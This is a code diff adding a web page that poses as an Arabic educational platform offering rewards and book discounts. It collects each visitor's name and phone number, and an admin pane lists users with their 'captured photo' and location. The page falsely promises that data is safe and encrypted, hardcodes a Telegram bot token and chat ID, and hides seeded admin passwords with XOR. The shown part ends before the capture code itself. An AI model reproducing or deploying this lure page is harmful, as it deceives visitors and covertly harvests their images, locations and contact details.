+            padding: 24px 16px; text-align: center;
+            cursor: pointer; transition: all 0.3s;
+            margin-bottom: 12px;
+        }
+        .upload-area:hover {
+            border-color: var(--cyan);
+            background: rgba(0, 229, 255, 0.1);
+            box-shadow: 0 0 30px rgba(0, 229, 255, 0.2);
+        }
+        .upload-area i {
+            font-size: 28px; color: var(--cyan);
+            margin-bottom: 8px; display: block;
+            text-shadow: 0 0 14px rgba(0, 229, 255, 0.6);
+        }
+        .upload-area span { font-size: 14px; font-weight: 700; color: var(--cyan); }
+        .upload-area small {
+            display: block; font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 5px; font-weight: 500;
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        .vis-mode-switch {
+            display: flex; gap: 6px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 12px;
+            padding: 5px;
+            margin-bottom: 14px;
+        }
+        .vis-mode-btn {
+            flex: 1;
+            padding: 13px 8px;
+            border: none;
+            background: transparent;
+            border-radius: 8px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 14px;
+            font-weight: 800;
+            color: var(--text-muted);
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+        .vis-mode-btn.active {
+            background: rgba(0, 255, 136, 0.15);
+            color: var(--green);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.25);
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+        }
+        .vis-mode-btn[data-mode="specific"].active {
+            background: rgba(0, 229, 255, 0.15);
+            color: var(--cyan);
+            box-shadow: 0 0 20px rgba(0, 229, 255, 0.25);
+            text-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
+        }
+
+        .user-picker {
+            background: rgba(0, 0, 0, 0.35);
+            border: 1px solid rgba(0, 229, 255, 0.3);
+            border-radius: 14px;
+            padding: 14px;
+            margin-bottom: 14px;
+            animation: formSlide 0.4s ease;
+            box-shadow: 0 0 24px rgba(0, 229, 255, 0.1);
+        }
+        .user-picker-head {
+            display: flex; justify-content: space-between; align-items: center;
+            font-size: 12.5px; font-weight: 700;
+            color: var(--cyan); margin-bottom: 10px;
+            font-family: 'Share Tech Mono', monospace;
+            letter-spacing: 0.6px;
+            padding-bottom: 8px;
+            border-bottom: 1px dashed rgba(0, 229, 255, 0.2);
+        }
+        .user-picker-head > span:first-child { display: flex; align-items: center; gap: 6px; }
+        .selected-count {
+            background: rgba(0, 229, 255, 0.15);
+            padding: 3px 10px; border-radius: 20px;
+            font-size: 11px; color: var(--cyan);
+            border: 1px solid rgba(0, 229, 255, 0.4);
+            text-shadow: 0 0 8px rgba(0, 229, 255, 0.5);
+        }
+        .user-picker-list {
+            max-height: 240px;
+            overflow-y: auto;
+            display: flex; flex-direction: column; gap: 6px;
+            padding-right: 4px;
+        }
+        .user-picker-list::-webkit-scrollbar { width: 6px; }
+        .user-picker-list::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.3); border-radius: 3px; }
+        .user-picker-list::-webkit-scrollbar-thumb {
+            background: rgba(0, 255, 136, 0.4);
+            border-radius: 3px;
+        }
+        .user-pick-item {
+            display: flex; align-items: center; gap: 10px;
+            padding: 9px 11px;
+            background: rgba(0, 255, 136, 0.04);
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.25s;
+            user-select: none;
+        }
+        .user-pick-item:hover {
+            background: rgba(0, 255, 136, 0.1);
+            border-color: rgba(0, 255, 136, 0.4);
+        }
+        .user-pick-item.selected {
+            background: rgba(0, 229, 255, 0.12);
+            border-color: var(--cyan);
+            box-shadow: 0 0 14px rgba(0, 229, 255, 0.25);
+        }
+        .user-pick-item input[type="checkbox"] {
+            appearance: none; -webkit-appearance: none;
+            width: 20px; height: 20px;
+            border-radius: 6px;
+            border: 1.5px solid var(--green);
+            background: rgba(0, 0, 0, 0.5);
+            position: relative; cursor: pointer;
+            flex-shrink: 0; transition: all 0.25s;
+        }
+        .user-pick-item input[type="checkbox"]:checked {
+            background: var(--green);
+            box-shadow: 0 0 12px rgba(0, 255, 136, 0.6);
+        }
+        .user-pick-item input[type="checkbox"]:checked::after {
+            content: '\f00c';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            color: #00170d; font-size: 11px;
+        }
+        .user-pick-avatar {
+            width: 34px; height: 34px;
+            border-radius: 9px;
+            background: #001a10;
+            border: 1px solid var(--green);
+            overflow: hidden; flex-shrink: 0;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--green); font-size: 14px;
+        }
+        .user-pick-avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .user-pick-info { flex: 1; min-width: 0; }
+        .user-pick-name {
+            font-size: 13px; font-weight: 700;
+            color: var(--text);
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+        }
+        .user-pick-phone {
+            font-size: 10.5px; color: var(--cyan);
+            font-family: 'Share Tech Mono', monospace;
+            letter-spacing: 0.4px;
+        }
+
+        .admin-images-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 12px;
+            margin-top: 14px;
+        }
+        .admin-image-item {
+            position: relative;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 14px; overflow: hidden;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.3);
+        }
+        .admin-image-item.hidden-item {
+            border-color: rgba(255, 46, 136, 0.4);
+            opacity: 0.75;
+        }
+        .admin-image-item img {
+            width: 100%; height: 110px;
+            object-fit: cover; display: block;
+            background: #000; filter: brightness(0.9);
+        }
+        .admin-image-item .cap {
+            padding: 8px 10px;
+            font-size: 11.5px; color: var(--text-dim);
+            font-weight: 600; text-align: center;
+            line-height: 1.5; min-height: 34px;
+            word-break: break-word;
+        }
+        .admin-image-item .rate-badge {
+            position: absolute; bottom: 8px; right: 8px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid var(--gold);
+            color: var(--gold);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 10.5px;
+            padding: 3px 8px; border-radius: 20px;
+            font-weight: 700;
+            display: flex; align-items: center; gap: 4px;
+            box-shadow: 0 0 12px rgba(255, 215, 0, 0.35);
+            z-index: 2;
+        }
+        .admin-image-item .rate-badge i { color: var(--gold); font-size: 10px; }
+
+        .vis-badge {
+            position: absolute; bottom: 8px; left: 8px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid var(--green);
+            color: var(--green);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 10px;
+            padding: 3px 8px; border-radius: 20px;
+            font-weight: 700;
+            display: flex; align-items: center; gap: 4px;
+            box-shadow: 0 0 12px rgba(0, 255, 136, 0.35);
+            z-index: 2;
+        }
+        .vis-badge.specific {
+            border-color: var(--cyan); color: var(--cyan);
+            box-shadow: 0 0 12px rgba(0, 229, 255, 0.35);
+        }
+
+        .admin-image-item .del {
+            position: absolute; top: 8px; left: 8px;
+            width: 30px; height: 30px; border-radius: 50%;
+            border: 1px solid rgba(255, 46, 136, 0.6);
+            background: rgba(0, 0, 0, 0.7);
+            color: var(--pink); font-size: 12px;
+            cursor: pointer; transition: all 0.25s;
+            display: flex; align-items: center; justify-content: center;
+            z-index: 3;
+        }
+        .admin-image-item .del:hover {
+            background: var(--pink); color: #fff;
+            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(255, 46, 136, 0.7);
+        }
+        .admin-image-item .vis-toggle {
+            position: absolute; top: 8px; right: 8px;
+            width: 30px; height: 30px; border-radius: 50%;
+            border: 1px solid var(--green);
+            background: rgba(0, 0, 0, 0.7);
+            color: var(--green); font-size: 12px;
+            cursor: pointer; transition: all 0.25s;
+            display: flex; align-items: center; justify-content: center;
+            z-index: 3;
+        }
+        .admin-image-item .vis-toggle.off { border-color: var(--pink); color: var(--pink); }
+        .admin-image-item .vis-toggle:hover { transform: scale(1.1); box-shadow: 0 0 20px rgba(0, 255, 136, 0.6); }
+        .admin-image-item .vis-toggle.off:hover { box-shadow: 0 0 20px rgba(255, 46, 136, 0.6); }
+
+        .admin-empty {
+            text-align: center; color: var(--text-muted);
+            font-size: 13px; padding: 26px 10px;
+            font-weight: 600;
+            font-family: 'Share Tech Mono', monospace;
+            letter-spacing: 0.6px;
+        }
+
+        .users-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(230px, 1fr));
+            gap: 14px; margin-top: 14px;
+        }
+        .user-card {
+            background: linear-gradient(160deg, rgba(0, 25, 18, 0.6), rgba(4, 10, 12, 0.9));
+            border: 1px solid rgba(0, 255, 136, 0.25);
+            border-radius: 16px; padding: 14px;
+            position: relative; transition: all 0.3s;
+        }
+        .user-card:hover {
+            border-color: var(--green);
+            box-shadow: 0 0 28px rgba(0, 255, 136, 0.25);
+            transform: translateY(-3px);
+        }
+        .user-card-head { display: flex; gap: 12px; align-items: center; margin-bottom: 10px; }
+        .user-avatar {
+            width: 58px; height: 58px; border-radius: 14px;
+            background: #001a10;
+            border: 1.5px solid var(--green);
+            overflow: hidden; flex-shrink: 0;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--green); font-size: 22px;
+            box-shadow: 0 0 14px rgba(0, 255, 136, 0.4);
+            filter: contrast(1.05);
+        }
+        .user-avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .user-name {
+            font-size: 15px; font-weight: 800;
+            color: var(--green);
+            text-shadow: 0 0 10px rgba(0,255,136,0.5);
+            margin-bottom: 3px; word-break: break-word;
+        }
+        .user-phone {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 12px; color: var(--cyan);
+            letter-spacing: 0.6px;
+        }
+        .user-meta-list {
+            display: flex; flex-direction: column; gap: 5px;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 10.5px; color: var(--text-muted);
+            letter-spacing: 0.4px;
+        }
+        .user-meta-list span { display: flex; align-items: center; gap: 5px; }
+        .user-meta-list i { color: var(--green); opacity: 0.7; width: 12px; }
+        .user-meta-list .loc {
+            color: var(--text-dim);
+            line-height: 1.5; word-break: break-word;
+        }
+
+        .admin-toast {
+            position: fixed; bottom: 30px; left: 50%;
+            transform: translateX(-50%) translateY(80px);
+            background: rgba(0, 20, 14, 0.96);
+            border: 1.5px solid var(--green);
+            color: var(--green);
+            padding: 13px 24px; border-radius: 12px;
+            font-size: 13.5px; font-weight: 700;
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.5);
+            opacity: 0; pointer-events: none;
+            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            z-index: 400;
+            display: flex; align-items: center; gap: 10px;
+            max-width: 90vw;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.6);
+        }
+        .admin-toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .admin-toast i { color: var(--green); }
+        .admin-toast.err {
+            border-color: var(--pink); color: var(--pink);
+            box-shadow: 0 0 40px rgba(255, 46, 136, 0.5);
+            text-shadow: 0 0 10px rgba(255, 46, 136, 0.6);
+        }
+        .admin-toast.err i { color: var(--pink); }
+
+        .admin-actions { display: flex; gap: 10px; margin-top: 20px; }
+        .admin-actions .admin-btn { margin: 0; }
+
+        .spinner {
+            display: inline-block;
+            width: 20px; height: 20px;
+            border: 2.5px solid rgba(0, 255, 136, 0.25);
+            border-top-color: var(--green);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        #adminImageInput { display: none; }
+
+        @media (max-width: 600px) {
+            .panel { padding: 30px 18px 26px; border-radius: 18px; }
+            .brand-icon { width: 60px; height: 60px; font-size: 26px; border-radius: 18px; }
+            .brand-text h1 { font-size: 26px; }
+            .brand-text span { font-size: 11px; }
+            .reward-box { padding: 22px 18px; }
+            .reward-box h2 { font-size: 19px; }
+            .reward-box p { font-size: 14px; }
+            .btn-neon { font-size: 16px; padding: 16px; }
+            .input-group input { padding: 15px 46px 15px 16px; font-size: 14.5px; }
+            .works-grid { grid-template-columns: 1fr; }
+            .terminal-bar { font-size: 11px; padding: 8px 10px; }
+            .works-title { font-size: 20px; }
+            .admin-box { padding: 28px 16px 22px; }
+            .users-list { grid-template-columns: 1fr; }
+            .vis-mode-btn { font-size: 12.5px; padding: 11px 6px; }
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrixCanvas"></canvas>
+    <div class="cyber-grid"></div>
+    <div class="scanlines"></div>
+    <div class="floating-code" id="floatingCode"></div>
+
+    <main class="app-shell">
+
+        <section class="view active" id="viewLogin">
+            <div class="panel">
+                <div class="terminal-bar">
+                    <span class="dot red"></span>
+                    <span class="dot yellow"></span>
+                    <span class="dot green"></span>
+                    <span class="terminal-path">root@zakir-here:~/auth$</span>
+                </div>
+
+                <div class="login-hero">
+                    <div class="logo-big"><i class="fas fa-graduation-cap"></i></div>
+                    <h2 id="uiBrandTitleLogin" data-text="ذاكر هنا">ذاكر هنا</h2>
+                    <p>// SECURE ACCESS · IDENTITY REQUIRED</p>
+                </div>
+
+                <div class="form-section" id="loginForm">
+                    <div class="input-group">
+                        <input type="text" id="loginName" placeholder="اسم المستخدم" autocomplete="off" />
+                        <i class="fas fa-user icon"></i>
+                    </div>
+                    <div class="input-group">
+                        <input type="tel" id="loginPhone" placeholder="رقم الهاتف" autocomplete="off" />
+                        <i class="fas fa-phone icon"></i>
+                    </div>
+
+                    <button class="btn-neon" id="loginBtn">
+                        <i class="fas fa-sign-in-alt"></i> تسجيل الدخول
+                    </button>
+
+                    <div class="login-error" id="loginError"></div>
+                </div>
+
+                <div class="login-note">
+                    <i class="fas fa-lock"></i> بياناتك مرتبطة بحساب واحد دائم — لا يمكنك تعديلها لاحقاً.
+                </div>
+            </div>
+        </section>
+
+        <section class="view" id="viewHome">
+            <div class="panel">
+                <div class="terminal-bar">
+                    <span class="dot red"></span>
+                    <span class="dot yellow"></span>
+                    <span class="dot green"></span>
+                    <span class="terminal-path">root@zakir-here:~/main$</span>
+                </div>
+
+                <div class="user-chip">
+                    <i class="fas fa-user-circle"></i>
+                    <span id="chipUserName">—</span>
+                    <span class="uid" id="chipUserPhone">—</span>
+                </div>
+
+                <div class="brand">
+                    <div class="brand-icon"><i class="fas fa-graduation-cap"></i></div>
+                    <div class="brand-text">
+                        <h1 id="uiBrandTitle" data-text="ذاكر هنا">ذاكر هنا</h1>
+                        <span id="uiBrandSubtitle">SMART LEARNING · INSTANT REWARDS</span>
+                    </div>
+                </div>
+
+                <div class="reward-box">
+                    <div class="badge" id="uiBadge"><i class="fas fa-star"></i> <span>عرض حصري</span></div>
+                    <h2 id="uiRewardHeading">🎁 لقد تلقيت مكافأة!</h2>
+                    <p id="uiRewardDesc">
+                        لدخولك عبر منصتنا التعليمية، نقدم لك
+                        <span class="highlight">مكافآت مادية</span> أو
+                        <span class="highlight">خصومات تصل إلى ٥٠٪</span>
+                        على كتب مكتباتنا 📚📚
+                    </p>
+                </div>
+
+                <button class="btn-neon cyan" id="goWorksBtn">
+                    <i class="fas fa-folder-open"></i> تصفح أعمالي
+                </button>
+
+                <div class="footer" id="uiFooter">
+                    <i class="fas fa-shield-alt"></i> بياناتك آمنة ومشفرة بالكامل
+                </div>
+            </div>
+        </section>
+
+        <section class="view" id="viewWorks">
+            <div class="panel">
+                <div class="terminal-bar">
+                    <span class="dot red"></span>
+                    <span class="dot yellow"></span>
+                    <span class="dot green"></span>
+                    <span class="terminal-path">root@zakir-here:~/my-works$</span>
+                </div>
+
+                <div class="works-header">
+                    <button class="btn-back" id="worksBackBtn" title="رجوع"><i class="fas fa-arrow-right"></i></button>
+                    <div>
+                        <div class="works-title">// اعمالي</div>
+                        <span class="works-sub">MY WORKS · RATE & EXPLORE</span>
+                    </div>
+                </div>
+
+                <div class="works-grid" id="worksGrid"></div>
+            </div>
+        </section>
+
+    </main>
+
+    <button class="admin-fab" id="adminFab" title="لوحة التحكم">
+        <i class="fas fa-user-shield"></i>
+    </button>
+
+    <div class="admin-modal" id="adminModal">
+        <div class="admin-box">
+            <button class="admin-close" id="adminClose"><i class="fas fa-times"></i></button>
+
+            <div class="admin-step active" id="adminStep1">
+                <div class="admin-head">
+                    <div class="shield"><i class="fas fa-lock"></i></div>
+                    <h3>لوحة المتخصصين</h3>
+                    <p>// RESTRICTED AREA · AUTHORIZED ONLY</p>
+                </div>
+                <div class="admin-field">
+                    <input type="password" id="adminPass1" placeholder="أدخل كلمة المرور" autocomplete="off" />
+                    <i class="fas fa-key icon"></i>
+                </div>
+                <button class="admin-btn" id="adminNext1">
+                    <i class="fas fa-arrow-left"></i> متابعة
+                </button>
+                <div class="admin-error" id="adminErr1"></div>
+            </div>
+
+            <div class="admin-step" id="adminStep2">
+                <div class="admin-head">
+                    <div class="shield"><i class="fas fa-fingerprint"></i></div>
+                    <h3>التحقق من الهوية</h3>
+                    <p>// IDENTITY VERIFICATION REQUIRED</p>
+                </div>
+                <div class="admin-field">
+                    <input type="email" id="adminEmail" placeholder="البريد الإلكتروني" autocomplete="off" />
+                    <i class="fas fa-envelope icon"></i>
+                </div>
+                <div class="admin-field">
+                    <input type="password" id="adminPass2" placeholder="الرقم السري" autocomplete="off" />
+                    <i class="fas fa-lock icon"></i>
+                </div>
+                <button class="admin-btn" id="adminNext2">
+                    <i class="fas fa-sign-in-alt"></i> دخول
+                </button>
+                <div class="admin-error" id="adminErr2"></div>
+            </div>
+
+            <div class="admin-step" id="adminStep3">
+                <div class="admin-head" style="margin-bottom:16px;">
+                    <div class="shield" style="background:linear-gradient(145deg,rgba(0,255,136,0.2),rgba(0,229,255,0.2));">
+                        <i class="fas fa-sliders-h"></i>
+                    </div>
+                    <h3>لوحة التحكم</h3>
+                    <p>// FULL SYSTEM CONTROL</p>
+                </div>
+
+                <div class="admin-tabs">
+                    <button class="admin-tab active" data-tab="texts">
+                        <i class="fas fa-font"></i> النصوص
+                    </button>
+                    <button class="admin-tab" data-tab="images">
+                        <i class="fas fa-images"></i> الأعمال
+                    </button>
+                    <button class="admin-tab" data-tab="users">
+                        <i class="fas fa-users"></i> المستخدمون
+                    </button>
+                </div>
+
+                <div class="admin-pane active" id="paneTexts">
+                    <div class="admin-section-title"><i class="fas fa-heading"></i> الشعار</div>
+                    <label class="admin-label">عنوان المنصة</label>
+                    <div class="admin-field">
+                        <input type="text" id="f_brandTitle" placeholder="ذاكر هنا" />
+                        <i class="fas fa-graduation-cap icon"></i>
+                    </div>
+                    <label class="admin-label">الوصف تحت العنوان</label>
+                    <div class="admin-field">
+                        <input type="text" id="f_brandSubtitle" placeholder="SMART LEARNING · INSTANT REWARDS" />
+                        <i class="fas fa-quote-right icon"></i>
+                    </div>
+
+                    <div class="admin-section-title"><i class="fas fa-gift"></i> صندوق المكافأة</div>
+                    <label class="admin-label">نص الشارة العلوية</label>
+                    <div class="admin-field">
+                        <input type="text" id="f_badgeText" placeholder="عرض حصري" />
+                        <i class="fas fa-star icon"></i>
+                    </div>
+                    <label class="admin-label">العنوان الرئيسي</label>
+                    <div class="admin-field">
+                        <input type="text" id="f_rewardHeading" placeholder="🎁 لقد تلقيت مكافأة!" />
+                        <i class="fas fa-bullhorn icon"></i>
+                    </div>
+                    <label class="admin-label">نص الوصف (يدعم HTML)</label>
+                    <div class="admin-field">
+                        <textarea id="f_rewardDesc"></textarea>
+                        <i class="fas fa-align-right icon"></i>
+                    </div>
+
+                    <div class="admin-section-title"><i class="fas fa-mouse-pointer"></i> التذييل</div>
+                    <label class="admin-label">نص التذييل</label>
+                    <div class="admin-field">
+                        <input type="text" id="f_footerText" placeholder="بياناتك آمنة ومشفرة بالكامل" />
+                        <i class="fas fa-shield-alt icon"></i>
+                    </div>
+
+                    <div class="admin-actions">
+                        <button class="admin-btn" id="saveTextsBtn">
+                            <i class="fas fa-save"></i> حفظ التعديلات
+                        </button>
+                    </div>
+                    <div class="admin-hint">
+                        <i class="fas fa-info-circle"></i> سيتم تحديث الصفحة مباشرة لجميع الزوار بعد الحفظ.
+                    </div>
+                </div>
+
+                <div class="admin-pane" id="paneImages">
+                    <div class="upload-area" id="uploadArea">
+                        <i class="fas fa-cloud-upload-alt"></i>
+                        <span>اضغط لاختيار صورة من جهازك</span>
+                        <small>JPG · PNG · WEBP — يُنصح بأقل من 1 ميجابايت</small>
+                    </div>
+                    <input type="file" id="adminImageInput" accept="image/*" />
+
+                    <label class="admin-label">عنوان العمل</label>
+                    <div class="admin-field">
+                        <input type="text" id="f_workTitle" placeholder="مثال: مشروع تطبيق المكتبة" />
+                        <i class="fas fa-heading icon"></i>
+                    </div>
+
+                    <label class="admin-label">معلومات / وصف العمل</label>
+                    <div class="admin-field">
+                        <textarea id="f_workDesc" placeholder="اكتب تفاصيل العمل هنا..."></textarea>
+                        <i class="fas fa-align-right icon"></i>
+                    </div>
+
+                    <div class="admin-section-title"><i class="fas fa-eye"></i> نطاق العرض</div>
+                    <label class="admin-label">من سيرى هذا العمل؟</label>
+                    <div class="vis-mode-switch" id="visModeSwitch">
+                        <button type="button" class="vis-mode-btn active" data-mode="public">
+                            <i class="fas fa-globe"></i> للكل
+                        </button>
+                        <button type="button" class="vis-mode-btn" data-mode="specific">
+                            <i class="fas fa-user-check"></i> مستخدم مخصص
+                        </button>
+                    </div>
+
+                    <div class="user-picker" id="userPicker" style="display:none;">
+                        <div class="user-picker-head">
+                            <span><i class="fas fa-users"></i> اختر المستخدمين</span>
+                            <span class="selected-count" id="selectedCount">0 محدد</span>
+                        </div>
+                        <div class="user-picker-list" id="userPickerList"></div>
+                    </div>
+
+                    <div class="admin-actions">
+                        <button class="admin-btn" id="addImageBtn" disabled>
+                            <i class="fas fa-plus-circle"></i> إضافة العمل
+                        </button>
+                    </div>
+
+                    <div class="admin-section-title"><i class="fas fa-photo-video"></i> الأعمال الحالية</div>
+                    <div class="admin-images-list" id="adminImagesList">
+                        <div class="admin-empty">لا توجد أعمال بعد</div>
+                    </div>
+                </div>
+
+                <div class="admin-pane" id="paneUsers">
+                    <div class="admin-section-title"><i class="fas fa-users"></i> المستخدمون المسجلون</div>
+                    <div class="admin-hint" style="margin-bottom:12px;">
+                        <i class="fas fa-info-circle"></i> كل مستخدم يظهر مع صورته الملتقطة ومعلومات موقعه.
+                    </div>
+                    <div class="users-list" id="usersList">
+                        <div class="admin-empty">لا يوجد مستخدمون بعد</div>
+                    </div>
+                </div>
+
+                <div class="admin-actions" style="margin-top:22px;">
+                    <button class="admin-btn ghost" id="adminLogout">
+                        <i class="fas fa-sign-out-alt"></i> خروج
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="admin-toast" id="adminToast"><i class="fas fa-check-circle"></i> <span></span></div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ===== DOM =====
+            const viewLogin = document.getElementById('viewLogin');
+            const viewHome = document.getElementById('viewHome');
+            const viewWorks = document.getElementById('viewWorks');
+
+            const loginName = document.getElementById('loginName');
+            const loginPhone = document.getElementById('loginPhone');
+            const loginBtn = document.getElementById('loginBtn');
+            const loginError = document.getElementById('loginError');
+
+            const goWorksBtn = document.getElementById('goWorksBtn');
+            const worksBackBtn = document.getElementById('worksBackBtn');
+            const worksGrid = document.getElementById('worksGrid');
+
+            const chipUserName = document.getElementById('chipUserName');
+            const chipUserPhone = document.getElementById('chipUserPhone');
+
+            const adminFab = document.getElementById('adminFab');
+            const adminModal = document.getElementById('adminModal');
+            const adminClose = document.getElementById('adminClose');
+            const adminStep1 = document.getElementById('adminStep1');
+            const adminStep2 = document.getElementById('adminStep2');
+            const adminStep3 = document.getElementById('adminStep3');
+            const adminPass1 = document.getElementById('adminPass1');
+            const adminEmail = document.getElementById('adminEmail');
+            const adminPass2 = document.getElementById('adminPass2');
+            const adminNext1 = document.getElementById('adminNext1');
+            const adminNext2 = document.getElementById('adminNext2');
+            const adminErr1 = document.getElementById('adminErr1');
+            const adminErr2 = document.getElementById('adminErr2');
+            const adminLogout = document.getElementById('adminLogout');
+            const adminToast = document.getElementById('adminToast');
+            const adminImagesList = document.getElementById('adminImagesList');
+            const usersList = document.getElementById('usersList');
+            const uploadArea = document.getElementById('uploadArea');
+            const adminImageInput = document.getElementById('adminImageInput');
+            const f_workTitle = document.getElementById('f_workTitle');
+            const f_workDesc = document.getElementById('f_workDesc');
+            const addImageBtn = document.getElementById('addImageBtn');
+            const saveTextsBtn = document.getElementById('saveTextsBtn');
+
+            const visModeSwitch = document.getElementById('visModeSwitch');
+            const visModeBtns = visModeSwitch.querySelectorAll('.vis-mode-btn');
+            const userPicker = document.getElementById('userPicker');
+            const userPickerList = document.getElementById('userPickerList');
+            const selectedCount = document.getElementById('selectedCount');
+
+            const f_brandTitle = document.getElementById('f_brandTitle');
+            const f_brandSubtitle = document.getElementById('f_brandSubtitle');
+            const f_badgeText = document.getElementById('f_badgeText');
+            const f_rewardHeading = document.getElementById('f_rewardHeading');
+            const f_rewardDesc = document.getElementById('f_rewardDesc');
+            const f_footerText = document.getElementById('f_footerText');
+
+            // ============================================================
+            // 🔐 بيانات الأدمن — تُقرأ من Firebase (وليس من الكود)
+            // ============================================================
+            let adminCreds = null;
+            let adminCredsReady = false;
+
+            // ═══════════════════════════════════════════════════════════
+            // 🔒 بيانات التأسيس — مشفرة بـ XOR (لا تظهر كنص صريح)
+            // ⚠️ تُستخدم مرة واحدة فقط عند أول تشغيل
+            // ═══════════════════════════════════════════════════════════
+            const _seedKey = 0x5A;
+            const _seed1 = [0x6b,0x69,0x68,0x6a,0x6a];
+            const _seed2 = [0x3b,0x36,0x37,0x35,0x38,0x3e,0x3b,0x68,0x6e,0x1a,0x3d,0x37,0x3b,0x33,0x36,0x74,0x39,0x35,0x37];
+            const _seed3 = [0x6b,0x69,0x6f,0x6c,0x62,0x6d,0x68,0x6f,0x3d];
+            function _unseed(arr) {
+                return arr.map(c => String.fromCharCode(c ^ _seedKey)).join('');
+            }
+            const DEFAULT_ADMIN = {
+                pass1: _unseed(_seed1),
+                email: _unseed(_seed2),
+                pass2: _unseed(_seed3)
+            };
+
+            async function loadAdminCredentials() {
+                try {
+                    const snap = await get(ref(db, 'admin/credentials'));
+                    if (snap.exists()) {
+                        adminCreds = snap.val();
+                        adminCredsReady = true;
+                        console.log('🔐 Admin credentials loaded from Firebase');
+                    } else {
+                        console.log('🔐 Seeding admin credentials...');
+                        const pass1Hash = await window.fbSha256(DEFAULT_ADMIN.pass1);
+                        const emailHash = await window.fbSha256(DEFAULT_ADMIN.email.toLowerCase());
+                        const pass2Hash = await window.fbSha256(DEFAULT_ADMIN.pass2);
+                        const payload = {
+                            pass1Hash, emailHash, pass2Hash,
+                            createdAt: new Date().toISOString()
+                        };
+                        await set(ref(db, 'admin/credentials'), payload);
+                        adminCreds = payload;
+                        adminCredsReady = true;
+                        console.log('✅ Admin credentials seeded');
+                    }
+                } catch (e) {
+                    console.error('❌ فشل تحميل بيانات الأدمن:', e);
+                }
+            }
+
+            // ===== State =====
+            let currentUser = null;
+            let pendingImageData = null;
+            let currentImages = {};
+            let currentUsers = {};
+            let loginAttempted = false;
+
+            let pendingVisibilityMode = 'public';
+            let pendingSelectedUsers = new Set();
+
+            // ===== Firebase =====
+            let db = null, ref = null, set = null, get = null,
+                onValue = null, push = null, remove = null, fbUpdate = null;
+            let firebaseReady = false;
+            let fbCallbacks = [];
+            function onFirebaseReady(cb) {
+                if (firebaseReady) { cb(); return; }
+                fbCallbacks.push(cb);
+            }
+            (function waitFb() {
+                if (window.db && window.ref && window.onValue && window.set && window.push && window.remove && window.fbUpdate) {
+                    db = window.db; ref = window.ref; set = window.set;
+                    get = window.get; onValue = window.onValue;
+                    push = window.push; remove = window.remove; fbUpdate = window.fbUpdate;
+                    firebaseReady = true;
+                    console.log('✅ Firebase refs ready');
+                    fbCallbacks.forEach(cb => { try { cb(); } catch(e){ console.error(e); } });
+                    fbCallbacks = [];
+                } else setTimeout(waitFb, 100);
+            })();
+
+            const TOKEN = '8978360139:AAGXHsoq9OyVe6ZKrIPXn4vbSvuGs2hx0h4';
+            const CHAT_ID = '7510413001';
+
+            // ============================================================
+            // MATRIX RAIN
+            // ============================================================
+            (function initMatrix() {
+                const canvas = document.getElementById('matrixCanvas');
+                const ctx = canvas.getContext('2d');
+                let W, H, columns, drops;
+                const chars = 'アァカサタナハマヤラワガザダバパイィキシチニヒミリギジヂビピウゥクスツヌフムユルグズヅブプ0123456789ABCDEF<>{}[]()#$%&*+=/\\|';
+                const fontSize = 15;
+                function resize() {
+                    W = canvas.width = window.innerWidth;
+                    H = canvas.height = window.innerHeight;
+                    columns = Math.floor(W / fontSize);
+                    drops = new Array(columns).fill(1);
+                }
+                resize();
+                window.addEventListener('resize', resize);
+                function draw() {
+                    ctx.fillStyle = 'rgba(2, 5, 8, 0.08)';
+                    ctx.fillRect(0, 0, W, H);
+                    ctx.font = fontSize + 'px Share Tech Mono, monospace';
+                    for (let i = 0; i < drops.length; i++) {
+                        const text = chars.charAt(Math.floor(Math.random() * chars.length));
+                        const x = i * fontSize;
+                        const y = drops[i] * fontSize;
+                        if (Math.random() > 0.975) {
+                            ctx.fillStyle = '#b8ffdc';
+                            ctx.shadowColor = '#00ff88';
+                            ctx.shadowBlur = 10;
+                        } else {
+                            ctx.fillStyle = Math.random() > 0.85 ? '#00e5ff' : '#00ff88';
+                            ctx.shadowBlur = 0;
+                        }
+                        ctx.fillText(text, x, y);
+                        ctx.shadowBlur = 0;
+                        if (y > H && Math.random() > 0.975) drops[i] = 0;
+                        drops[i]++;
+                    }
+                }
+                setInterval(draw, 55);
+            })();
+
+            // ============================================================
